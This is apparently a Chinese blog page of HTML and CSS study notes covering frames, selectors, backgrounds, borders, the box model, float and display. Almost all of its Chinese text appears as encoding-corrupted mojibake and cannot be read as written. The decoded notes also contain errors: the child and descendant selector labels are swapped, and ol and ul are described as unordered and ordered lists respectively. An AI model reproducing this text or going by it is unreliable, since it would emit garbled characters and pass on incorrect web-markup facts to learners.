è¡¨ç¤ºä¸è¦è¾¹æ¡†ï¼Œ1 è¡¨ç¤ºè¦æ˜¾ç¤ºè¾¹æ¡†ã€‚</p><p>â‘¥noresize</p><p>è®¾ç½®æ¡†æ¶å¤§å°æ˜¯å¦èƒ½æ‰‹åŠ¨è°ƒèŠ‚ã€‚</p><p>â‘¦marginwidth</p><p>è®¾ç½®æ¡†æ¶è¾¹ç•Œå’Œå…¶ä¸­å†…å®¹ä¹‹é—´çš„å®½åº¦ã€‚</p><p>â‘§marginhight</p><p>è®¾ç½®æ¡†æ¶è¾¹ç•Œå’Œå…¶ä¸­å†…å®¹ä¹‹é—´çš„é«˜åº¦ã€‚</p><p>â‘¨width</p><p>è®¾ç½®æ¡†æ¶å®½åº¦ã€‚</p><p>â‘©height</p><p>è®¾ç½®æ¡†æ¶é«˜åº¦ã€‚</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235313862.png" alt="image-20220324235313862"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324235247186.png" alt="image-20220324235247186"></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;frameset rows=&quot;50%,50%&quot;&gt;         &lt;frame src=&quot;https://nsl.lenovo.com.cn/&quot; scrolling=&quot;no&quot; /&gt;        &lt;frame src=&quot;http://www.sogou.com&quot; /&gt;    &lt;/frameset&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324224952975.png" alt="image-20220324224952975" style="zoom:50%;"><hr><h1 id="div-css"><a href="#div-css" class="headerlink" title="div css"></a>div css</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å±‚å æ ·å¼è¡¨(è‹±æ–‡å…¨ç§°ï¼šCascading Style Sheets)æ˜¯ä¸€ç§ç”¨æ¥è¡¨ç°HTMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„ä¸€ä¸ªåº”ç”¨ï¼‰æˆ–XMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„ä¸€ä¸ªå­é›†ï¼‰ç­‰æ–‡ä»¶æ ·å¼çš„è®¡ç®—æœºè¯­è¨€ã€‚CSSä¸ä»…å¯ä»¥é™æ€åœ°ä¿®é¥°ç½‘é¡µï¼Œè¿˜å¯ä»¥é…åˆå„ç§è„šæœ¬è¯­è¨€åŠ¨æ€åœ°å¯¹ç½‘é¡µå„å…ƒç´ è¿›è¡Œæ ¼å¼åŒ–ã€‚</p><p>CSS èƒ½å¤Ÿå¯¹ç½‘é¡µä¸­å…ƒç´ ä½ç½®çš„æ’ç‰ˆè¿›è¡Œåƒç´ çº§ç²¾ç¡®æ§åˆ¶ï¼Œæ”¯æŒå‡ ä¹æ‰€æœ‰çš„å­—ä½“å­—å·æ ·å¼ï¼Œæ‹¥æœ‰å¯¹ç½‘é¡µå¯¹è±¡å’Œæ¨¡å‹æ ·å¼ç¼–è¾‘çš„èƒ½åŠ›ã€‚</p><p>DIVæ˜¯htmlçš„ä¸€ä¸ªæ ‡ç­¾ cssæ˜¯ä¸€ä¸ªæ ·å¼è¡¨</p><h2 id="æ ·å¼è¡¨ç±»å‹"><a href="#æ ·å¼è¡¨ç±»å‹" class="headerlink" title="æ ·å¼è¡¨ç±»å‹"></a>æ ·å¼è¡¨ç±»å‹</h2><h3 id="åµŒå…¥å¼æ ·å¼è¡¨"><a href="#åµŒå…¥å¼æ ·å¼è¡¨" class="headerlink" title="åµŒå…¥å¼æ ·å¼è¡¨"></a>åµŒå…¥å¼æ ·å¼è¡¨</h3><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;        &lt;style&gt;            .demo01&#123;                color: mediumvioletred;                width: 1000px;                height: 500px;                background: salmon;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class=&quot;demo01&quot;&gt;            äººç”Ÿè‹¥åªå¦‚åˆè§ï¼Œä½•äº‹ç§‹é£æ‚²ç”»æ‰‡        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325210711988.png" alt="image-20220325210711988"></p><h3 id="å¤–éƒ¨æ ·å¼"><a href="#å¤–éƒ¨æ ·å¼" class="headerlink" title="å¤–éƒ¨æ ·å¼"></a>å¤–éƒ¨æ ·å¼</h3><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;/&gt;@import url@import url(&quot;g.css&quot;);.demo1&#123;                color: red;                width: 100px;                height: 100px;                background: blue;            &#125;</code></pre><p><strong>1ã€linkç›´æ¥å¼•ç”¨</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325211849732.png" alt="image-20220325211849732"></p><p><strong>2ã€åœ¨å¤–éƒ¨å†å¼•ç”¨å¤–éƒ¨</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212537499.png" alt="image-20220325212537499"></p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212557848.png" alt="image-20220325212557848" style="zoom:50%;"><h3 id="å†…è”æ ·å¼"><a href="#å†…è”æ ·å¼" class="headerlink" title="å†…è”æ ·å¼"></a>å†…è”æ ·å¼</h3><pre><code class="html">&lt;div style=&quot;color: blue;width: 100px;height: 100px; background: black;&quot;&gt;demo2&lt;/div&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325213538813.png" alt="image-20220325213538813"></p><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><pre><code class="html">/* */ æ³¨é‡Šå†…å®¹</code></pre><h2 id="æ ·å¼é€‰æ‹©å™¨"><a href="#æ ·å¼é€‰æ‹©å™¨" class="headerlink" title="æ ·å¼é€‰æ‹©å™¨"></a>æ ·å¼é€‰æ‹©å™¨</h2><pre><code class="html">å…ƒç´ é€‰æ‹©å™¨   div&#123;å±æ€§:å€¼&#125;IDé€‰æ‹©å™¨  #id&#123;å±æ€§:å€¼&#125;classé€‰æ‹©å™¨  .ç±»å&#123;å±æ€§:å€¼&#125;å­é€‰æ‹©å™¨    å…ƒæ•° ç©ºæ ¼ å…ƒç´ &#123;å±æ€§:å€¼&#125;åä»£é€‰æ‹©å™¨  å…ƒæ•° &gt; å…ƒæ•°&#123;å±æ€§:å€¼&#125;å±æ€§é€‰æ‹©å™¨  å…ƒç´ [å±æ€§]&#123;&#125;é€šé…ç¬¦é€‰æ‹©å™¨  *&#123;å±æ€§:å€¼&#125;ç¾¤ç»„é€‰æ‹©å™¨  æŠŠç›¸åŒçš„å…ƒç´ å†™åœ¨ä¸€èµ·</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220117278.png" alt="image-20220325220117278"></p><p><strong>é€šé…ç¬¦é€‰æ‹©å™¨ç¤ºæ„</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220708388.png" alt="image-20220325220708388"></p><p><strong>ç¾¤ç»„é€‰æ‹©å™¨</strong></p><p>æŠŠç›¸åŒçš„å…ƒç´ å†™åœ¨ä¸€èµ·ï¼Œå‡å°‘é‡å¤ä»£ç </p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325221110722.png" alt="image-20220325221110722"></p><p><strong>å­é€‰æ‹©å™¨/åä»£é€‰æ‹©å™¨</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325222155359.png" alt="image-20220325222155359"></p><h2 id="èƒŒæ™¯å’Œè¾¹æ¡†"><a href="#èƒŒæ™¯å’Œè¾¹æ¡†" class="headerlink" title="èƒŒæ™¯å’Œè¾¹æ¡†"></a>èƒŒæ™¯å’Œè¾¹æ¡†</h2><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>background-color   è§„å®šè¦ä½¿ç”¨çš„èƒŒæ™¯é¢œè‰²ã€‚</p><p>background-position    è§„å®šèƒŒæ™¯å›¾åƒçš„ä½ç½®ã€‚    </p><p>background-size     è§„å®šèƒŒæ™¯å›¾ç‰‡çš„å°ºå¯¸ã€‚    </p><p>background-repeat  è§„å®šå¦‚ä½•é‡å¤èƒŒæ™¯å›¾åƒã€‚  </p><pre><code>repeat  é»˜è®¤ã€‚èƒŒæ™¯å›¾åƒå°†åœ¨å‚ç›´æ–¹å‘å’Œæ°´å¹³æ–¹å‘é‡å¤ã€‚repeat-x èƒŒæ™¯å›¾åƒå°†åœ¨æ°´å¹³æ–¹å‘é‡å¤ã€‚repeat-y èƒŒæ™¯å›¾åƒå°†åœ¨å‚ç›´æ–¹å‘é‡å¤ã€‚no-repeat   èƒŒæ™¯å›¾åƒå°†ä»…æ˜¾ç¤ºä¸€æ¬¡ã€‚inherit  è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ background-repeat å±æ€§çš„è®¾ç½®ã€‚</code></pre><p>background-origin  è§„å®šèƒŒæ™¯å›¾ç‰‡çš„å®šä½åŒºåŸŸã€‚    </p><p>background-clip     è§„å®šèƒŒæ™¯çš„ç»˜åˆ¶åŒºåŸŸã€‚    </p><p>background-attachment  è§„å®šèƒŒæ™¯å›¾åƒæ˜¯å¦å›ºå®šæˆ–è€…éšç€é¡µé¢çš„å…¶ä½™éƒ¨åˆ†æ»šåŠ¨ã€‚    </p><pre><code class="html">èƒŒæ™¯å›¾ç‰‡çš„æ»šåŠ¨èƒŒæ™¯å›¾ç‰‡æ˜¯å¦éšç€å†…å®¹çš„æ»šåŠ¨è€Œæ»šåŠ¨ç”±background-attachmentè®¾ç½®background-attachment:fixed; å›ºå®šï¼Œä¸éšå†…å®¹çš„æ»šåŠ¨è€Œæ»šåŠ¨background-attachment:scroll; æ»šåŠ¨ï¼Œéšå†…å®¹çš„æ»šåŠ¨è€Œæ»šåŠ¨</code></pre><p>background-image  è§„å®šè¦ä½¿ç”¨çš„èƒŒæ™¯å›¾åƒã€‚</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224711431.png" alt="image-20220325224711431"></p><p>ä¸Šè¿°bodyå¯ç›´æ¥ç®€å†™ä¸º</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224906687.png" alt="image-20220325224906687"></p><p>inherit  è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ background å±æ€§çš„è®¾ç½®ã€‚  </p><p>left top</p><p>left center</p><p>left bottom</p><p>right top</p><p>right center</p><p>right bottom</p><p>center top</p><p>center center</p><p>center bottom</p><h3 id="è¾¹æ¡†"><a href="#è¾¹æ¡†" class="headerlink" title="è¾¹æ¡†"></a>è¾¹æ¡†</h3><p>è¾¹æ¡†é¢œè‰² border-color:#000</p><p>è¾¹æ¡†å®½åº¦ border-width:1px;</p><p>border-left è®¾ç½®å·¦è¾¹æ¡†ï¼Œä¸€èˆ¬å•ç‹¬è®¾ç½®å·¦è¾¹æ¡†æ ·å¼ä½¿ç”¨</p><p>border-right è®¾ç½®å³è¾¹æ¡†ï¼Œä¸€èˆ¬å•ç‹¬è®¾ç½®å³è¾¹æ¡†æ ·å¼ä½¿ç”¨</p><p>border-top è®¾ç½®ä¸Šè¾¹æ¡†ï¼Œä¸€èˆ¬å•ç‹¬è®¾ç½®ä¸Šè¾¹æ¡†æ ·å¼ä½¿ç”¨</p><p>border-bottom è®¾ç½®ä¸‹è¾¹æ¡†ï¼Œä¸€èˆ¬å•ç‹¬è®¾ç½®ä¸‹è¾¹æ¡†æ ·å¼ä½¿ç”¨,æœ‰æ—¶å¯å°†ä¸‹è¾¹æ¡†æ ·å¼ä½œä¸ºcssä¸‹åˆ’çº¿æ•ˆæœåº”ç”¨ã€‚</p><p><strong>è¾¹æ¡†æ ·å¼å€¼å¦‚ä¸‹ï¼š</strong></p><p>none : ã€€æ— è¾¹æ¡†ã€‚ä¸ä»»ä½•æŒ‡å®šçš„border-widthå€¼æ— å…³</p><p>hidden : ã€€éšè—è¾¹æ¡†ã€‚IEä¸æ”¯æŒ</p><p>dotted : ã€€åœ¨MACå¹³å°ä¸ŠIE4+ä¸WINDOWSå’ŒUNIXå¹³å°ä¸ŠIE5.5+ä¸ºç‚¹çº¿ã€‚å¦åˆ™ä¸ºå®çº¿ï¼ˆå¸¸ç”¨ï¼‰</p><p>dashed : ã€€åœ¨MACå¹³å°ä¸ŠIE4+ä¸WINDOWSå’ŒUNIXå¹³å°ä¸ŠIE5.5+ä¸ºè™šçº¿ã€‚å¦åˆ™ä¸ºå®çº¿ï¼ˆå¸¸ç”¨ï¼‰</p><p>solid : ã€€å®çº¿è¾¹æ¡†ï¼ˆå¸¸ç”¨ï¼‰</p><p>double : ã€€åŒçº¿è¾¹æ¡†ã€‚ä¸¤æ¡å•çº¿ä¸å…¶é—´éš”çš„å’Œç­‰äºæŒ‡å®šçš„border-widthå€¼</p><p><strong>ä¸Š å³ ä¸‹å·¦ï¼š</strong></p><p>groove : ã€€æ ¹æ®border-colorçš„å€¼ç”»3Då‡¹æ§½</p><p>ridge : ã€€æ ¹æ®border-colorçš„å€¼ç”»è±å½¢è¾¹æ¡†</p><p>inset : ã€€æ ¹æ®border-colorçš„å€¼ç”»3Då‡¹è¾¹</p><p>outset : ã€€æ ¹æ®border-colorçš„å€¼ç”»3Då‡¸è¾¹</p><p><strong>ä¸Š å³ ä¸‹å·¦ ç®€å†™ï¼š</strong></p><p>border:5px solid red;</p><p> <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325231755509.png" alt="image-20220325231755509"></p><h2 id="æ–‡å­—å±æ€§"><a href="#æ–‡å­—å±æ€§" class="headerlink" title="æ–‡å­—å±æ€§"></a>æ–‡å­—å±æ€§</h2><p>color:red; æ–‡å­—é¢œè‰² #ffeeees</p><p>font-size:12px; æ–‡å­—å¤§å°</p><p>font-weight:bolds æ–‡å­—ç²—ç»†(bold/normal)</p><p>font-family:â€å®‹ä½“â€æ–‡å­—å­—ä½“</p><p>font-variant:small-capså°å†™å­—æ¯ä»¥å¤§å†™å­—æ¯æ˜¾ç¤º</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326001639314.png" alt="image-20220326001639314"></p><h2 id="æ–‡æœ¬å±æ€§-1"><a href="#æ–‡æœ¬å±æ€§-1" class="headerlink" title="æ–‡æœ¬å±æ€§"></a>æ–‡æœ¬å±æ€§</h2><p>text-align:center; æ–‡æœ¬å¯¹é½(right/left/center)</p><p>line-height:10px; è¡Œé—´è·(å¯é€šè¿‡å®ƒå®ç°æ–‡æœ¬çš„å‚ç›´å±…ä¸­)</p><p>text-indent:20px; é¦–è¡Œç¼©è¿›</p><p>text-decoration:none;</p><p>æ–‡æœ¬çº¿(none/underline/overline/line-through) underline/overline/line-through; å®šä¹‰æ–‡æœ¬ä¸Šçš„ä¸‹åˆ’çº¿/ä¸Šåˆ’çº¿/ä¸­åˆ’çº¿</p><p>letter-spacing: å­—é—´è·</p><p>æ–‡æœ¬åŸŸç¤ºä¾‹:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326004753645.png" alt="image-20220326004753645"></p><h2 id="åˆ—è¡¨-1"><a href="#åˆ—è¡¨-1" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><p>list-style-type   è®¾ç½®åˆ—è¡¨é¡¹æ ‡è®°çš„ç±»å‹ã€‚å‚é˜…ï¼šlist-style-type ä¸­å¯èƒ½çš„å€¼ã€‚</p><p>list-style-image ä½¿ç”¨å›¾åƒæ¥æ›¿æ¢åˆ—è¡¨é¡¹çš„æ ‡è®°ã€‚å‚é˜…ï¼šlist-style-image ä¸­å¯èƒ½çš„å€¼ã€‚</p><p>inherit  è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ list-style å±æ€§çš„å€¼</p><pre><code>å–å€¼:â€‹    disc: ç‚¹â€‹    circle: åœ†åœˆâ€‹    square: æ­£æ–¹å½¢â€‹    decimal: æ•°å­—â€‹    decimal-leading-zero: åè¿›åˆ¶æ•°ï¼Œä¸è¶³ä¸¤ä½çš„è¡¥é½å‰å¯¼0ï¼Œä¾‹å¦‚: 01, 02, 03, ..., 98, 99â€‹    lower-roman: å°å†™ç½—é©¬æ–‡å­—ï¼Œä¾‹å¦‚: i, ii, iii, iv, v, ...â€‹    upper-roman: å¤§å†™ç½—é©¬æ–‡å­—ï¼Œä¾‹å¦‚: I, II, III, IV, V, ...â€‹    lower-greek: å°å†™å¸Œè…Šå­—æ¯ï¼Œä¾‹å¦‚: Î±(alpha), Î²(beta), Î³(gamma), ...â€‹    lower-latin: å°å†™æ‹‰ä¸æ–‡ï¼Œä¾‹å¦‚: a, b, c, ... zâ€‹    upper-latin: å¤§å†™æ‹‰ä¸æ–‡ï¼Œä¾‹å¦‚: A, B, C, ... Zâ€‹    armenian: äºšç¾å°¼äºšæ•°å­—â€‹    georgian: ä¹”æ²»äºšæ•°å­—ï¼Œä¾‹å¦‚: an, ban, gan, ..., he, tan, in, in-an, ...â€‹    lower-alpha: å°å†™æ‹‰ä¸æ–‡ï¼Œä¾‹å¦‚: a, b, c, ... zâ€‹    upper-alpha: å¤§å†™æ‹‰ä¸æ–‡ï¼Œä¾‹å¦‚: A, B, C, ... Zâ€‹    none: æ— (å–æ¶ˆæ‰€æœ‰çš„listæ ·å¼)â€‹    inherit:ç»§æ‰¿</code></pre><p>list-style-position   è®¾ç½®åœ¨ä½•å¤„æ”¾ç½®åˆ—è¡¨é¡¹æ ‡è®°ã€‚å‚é˜…ï¼šlist-style-position ä¸­å¯èƒ½çš„å€¼ã€‚</p><pre><code>insideåˆ—è¡¨é¡¹ç›®æ ‡è®°æ”¾ç½®åœ¨æ–‡æœ¬ä»¥å†…ï¼Œä¸”ç¯ç»•æ–‡æœ¬æ ¹æ®æ ‡è®°å¯¹é½ã€‚outsideé»˜è®¤å€¼ã€‚ä¿æŒæ ‡è®°ä½äºæ–‡æœ¬çš„å·¦ä¾§ã€‚åˆ—è¡¨é¡¹ç›®æ ‡è®°æ”¾ç½®åœ¨æ–‡æœ¬ä»¥å¤–ï¼Œä¸”ç¯ç»•æ–‡æœ¬ä¸æ ¹æ®æ ‡è®°å¯¹é½ã€‚ç®€å†™list-style:square inside url(&#39;/i/arrow.gif&#39;);</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326011302577.png" alt="image-20220326011302577"></p><h2 id="è¶…é“¾æ¥"><a href="#è¶…é“¾æ¥" class="headerlink" title="è¶…é“¾æ¥"></a>è¶…é“¾æ¥</h2><pre><code>a&#123;text-decoration: none;&#125;a:link &#123;color:#FF0000;&#125; /* æœªè®¿é—®çš„é“¾æ¥ */a:visited &#123;color:#00FF00;&#125; /* å·²è®¿é—®çš„é“¾æ¥ */a:hover &#123;color:#FF00FF;&#125; /* é¼ æ ‡åˆ’è¿‡é“¾æ¥ */a:active &#123;color:#0000FF;&#125; /* å·²é€‰ä¸­çš„é“¾æ¥ */</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326012956179.png" alt="image-20220326012956179"></p><h2 id="ç›’å­æ¨¡å‹"><a href="#ç›’å­æ¨¡å‹" class="headerlink" title="ç›’å­æ¨¡å‹"></a>ç›’å­æ¨¡å‹</h2><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326171556178.png" alt="image-20220326171556178"></p><p>ç›’å­æ¨¡å‹çš„ç»„æˆéƒ¨åˆ†ï¼š</p><p>å¤–è¾¹è·ï¼ˆmarginï¼‰ã€è¾¹æ¡†ï¼ˆborderï¼‰ã€å†…è¾¹è·ï¼ˆpaddingï¼‰ã€å†…å®¹ï¼ˆcontentï¼‰å››ä¸ªå±æ€§</p><p>è‡ªèº«çš„èº«é«˜:width height </p><p>å†…è¾¹è·: padding</p><p>ç›’å­è¾¹æ¡†:border</p><p>ä¸å…¶ä»–ç›’å­çš„è·ç¦» margin å¤–è¾¹è·</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326172438006.png" alt="image-20220326172438006"></p><h2 id="borderè¾¹æ¡†"><a href="#borderè¾¹æ¡†" class="headerlink" title="borderè¾¹æ¡†"></a>borderè¾¹æ¡†</h2><p>å¸¸è§çš„å†™æ³• border:1px solid #foo;</p><p>å•ç‹¬å±æ€§:</p><p>border-widh:</p><p>border-style:</p><pre><code>dotted ç‚¹çŠ¶è™šçº¿dashedï¼ˆè™šçº¿ï¼‰solidï¼ˆå®çº¿ï¼‰doubleï¼ˆåŒå®çº¿ï¼‰border-color(é¢œè‰²)</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326173422032.png" alt="image-20220326173422032"></p><h2 id="margin-padding"><a href="#margin-padding" class="headerlink" title="margin padding"></a>margin padding</h2><p>padding:å†…è¾¹è·</p><p>å€¼ï¼šåƒç´ /å˜ç±³ç­‰é•¿åº¦å•ä½ã€ç™¾åˆ†æ¯”</p><p>padding:10px; ä¸Šä¸‹å·¦å³</p><p>padding:10px 10px; ä¸Šä¸‹ å·¦å³</p><p>padding:10px 10px 10px; ä¸Š å·¦å³ ä¸‹</p><p>padding:10px 10px 10px 10px; ä¸Š å³ ä¸‹ å·¦ï¼ˆè®¾ç½®4ä¸ªç‚¹â€“&gt;é¡ºæ—¶é’ˆæ–¹å‘ï¼‰</p><p>å•ç‹¬å±æ€§</p><p>padding-top:</p><p>padding-right:</p><p>padding-bottom:</p><p>padding-left:</p><p>å½“è®¾ç½®å†…è¾¹è·çš„æ—¶å€™ä¼šæŠŠç›’å­æ’‘å¤§ï¼Œä¸ºäº†ä¿æŒç›’å­åŸæ¥çš„å¤§å°ï¼Œåº”è¯¥é«˜åº¦å’Œå®½åº¦è¿›è¡Œå‡å°ï¼Œæ ¹æ®widthå’Œheightå‡å°</p><p>margin å¤–è¾¹è·å€¼ï¼šä¸paddingç›¸åŒ</p><p> å•ç‹¬å±æ€§ï¼šä¸paddingç›¸åŒ </p><p>å¤–è¾¹è·åˆå¹¶ï¼šä¸¤ä¸ªç›’å­åŒæ—¶è®¾ç½®äº†å¤–è¾¹è·ï¼Œä¼šè¿›è¡Œä¸€ä¸ªå¤–è¾¹è·åˆå¹¶ </p><p>margin</p><p>margin:10px ä¸Šä¸‹å·¦å³éƒ½ä¼šè…¾å‡º10pxå‡ºæ¥</p><p>margin:0px auto; å±…ä¸­</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326175233023.png" alt="image-20220326175233023"></p><p><strong>è®©divå’Œå†…å®¹å±…ä¸­</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326180736898.png" alt="image-20220326180736898"></p><h2 id="float-è„±ç¦»æ–‡æ¡£æµæµ®åŠ¨"><a href="#float-è„±ç¦»æ–‡æ¡£æµæµ®åŠ¨" class="headerlink" title="float è„±ç¦»æ–‡æ¡£æµæµ®åŠ¨"></a>float è„±ç¦»æ–‡æ¡£æµæµ®åŠ¨</h2><p>left å…ƒç´ å‘å·¦æµ®åŠ¨ã€‚</p><p>right å…ƒç´ å‘å³æµ®åŠ¨</p><p>æ¸…é™¤æµ®åŠ¨:</p><pre><code>clear: both;leftright</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326210210962.png" alt="image-20220326210210962"></p><h2 id="å—çº§å…ƒç´ è¡Œå†…å…ƒç´ "><a href="#å—çº§å…ƒç´ è¡Œå†…å…ƒç´ " class="headerlink" title="å—çº§å…ƒç´ è¡Œå†…å…ƒç´ "></a>å—çº§å…ƒç´ è¡Œå†…å…ƒç´ </h2><p><strong>å—çº§å…ƒç´ </strong></p><p>ä»–ä¼šç‹¬å ä¸€è¡Œï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå…¶å®½åº¦è‡ªåŠ¨å¡«æ»¡å…¶çˆ¶å…ƒç´ çš„å®½åº¦ï¼›</p><p>å—çº§å…ƒç´ å¯ä»¥è®¾ç½®widthã€heightå±æ€§ï¼›</p><p>å—çº§å…ƒç´ å³ä½¿è®¾ç½®äº†å®½åº¦ä¹Ÿæ˜¯ç‹¬å ä¸€è¡Œï¼Œå—çº§å…ƒç´ å¯ä»¥è®¾ç½®marginã€paddingå±æ€§</p><p><strong>è¡Œå†…å…ƒç´ </strong></p><p>è¡Œå†…å…ƒç´ ä¸ä¼šç‹¬å ä¸€è¡Œï¼Œç›¸é‚»çš„è¡Œå†…å…ƒç´ ä¼šæ’åˆ—åœ¨åŒä¸€è¡Œé‡Œï¼Œç›´åˆ°è¡Œæ’ä¸ä¸‹ï¼Œå°±è‡ªåŠ¨æ¢è¡Œï¼Œå…¶å®½åº¦éšå†…å®¹è€Œå˜åŒ–ï¼›</p><p>è¡Œå†…å…ƒç´ çš„widthã€heightå±æ€§åˆ™æ— æ•ˆï¼›</p><p>è¡Œå†…å…ƒç´ çš„marginã€paddingå±æ€§å¾ˆå¥‡æ€ªï¼Œæ°´å¹³æ–¹å‘çš„padding-leftã€padding-rigthtã€margin-leftã€padding-rightéƒ½ä¼šäº§ç”Ÿè¾¹è·æ•ˆæœï¼Œä½†æ˜¯ç«–ç›´æ–¹å‘çš„padding-topã€padding-bottomã€margin-topã€margin-bottomå´ä¸äº§ç”Ÿè¾¹è·æ•ˆæœã€‚</p><p><strong>å—çº§å…ƒç´ (block element)</strong></p><pre><code>address åœ°å€center ä¸¾ä¸­å¯¹é½å—div- å¸¸ç”¨å—çº§å®¹æ˜“dl å®šä¹‰åˆ—è¡¨form äº¤äº’è¡¨å• ï¼ˆåªèƒ½ç”¨æ¥å®¹çº³å…¶å®ƒå—å…ƒç´ ï¼‰hæ ‡ç­¾hr æ°´å¹³åˆ†éš”çº¿ol æ— éœ€åˆ—è¡¨ulæœ‰åºåˆ—è¡¨p æ®µè½pre æ ¼å¼åŒ–æ–‡æœ¬</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326211940013.png" alt="image-20220326211940013"></p><p><strong>è¡Œå†…å…ƒç´ è½¬æ¢</strong></p><pre><code>display:none; ä¸æ˜¾ç¤ºdisplay:block;å˜æˆå—çº§å…ƒç´ display:inline; å˜æˆè¡Œå†…å…ƒç´ display:inline-block;ä»¥å—çº§å…ƒç´ æ ·å¼å±•ç¤ºï¼Œä»¥è¡Œçº§å…ƒç´ æ ·å¼æ’åˆ—</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326212608009.png" alt="image-20220326212608009"></p><p>ä¸¤ä¸ªå—çº§å…ƒç´ æ­¤æ—¶åœ¨åŒä¸€è¡Œäº†</p><p><strong>è¡Œå†…å…ƒç´ æº¢å‡ºå¤„ç†</strong></p><pre><code>overflow å±æ€§è§„å®šå½“å†…å®¹æº¢å‡ºå…ƒç´ æ¡†æ—¶å‘ç”Ÿçš„äº‹æƒ…ï¼švisible    é»˜è®¤å€¼ã€‚å†…å®¹ä¸ä¼šè¢«ä¿®å‰ªï¼Œä¼šå‘ˆç°åœ¨å…ƒç´ æ¡†ä¹‹å¤–ã€‚hidden    å†…å®¹ä¼šè¢«ä¿®å‰ªï¼Œå¹¶ä¸”å…¶ä½™å†…å®¹æ˜¯ä¸å¯è§çš„ã€‚scroll    å†…å®¹ä¼šè¢«ä¿®å‰ªï¼Œä½†æ˜¯æµè§ˆå™¨ä¼šæ˜¾ç¤ºæ»šåŠ¨æ¡ä»¥ä¾¿æŸ¥çœ‹å…¶ä½™çš„å†…å®¹ã€‚auto    å¦‚æœå†…å®¹è¢«ä¿®å‰ªï¼Œåˆ™æµè§ˆå™¨ä¼šæ˜¾ç¤ºæ»šåŠ¨æ¡ä»¥ä¾¿æŸ¥çœ‹å…¶ä½™çš„å†…å®¹ã€‚inherit    è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ overflow å±æ€§çš„å€¼ã€‚</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214145022.png" alt="image-20220326214145022"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­¤æ—¶å…ƒç´ 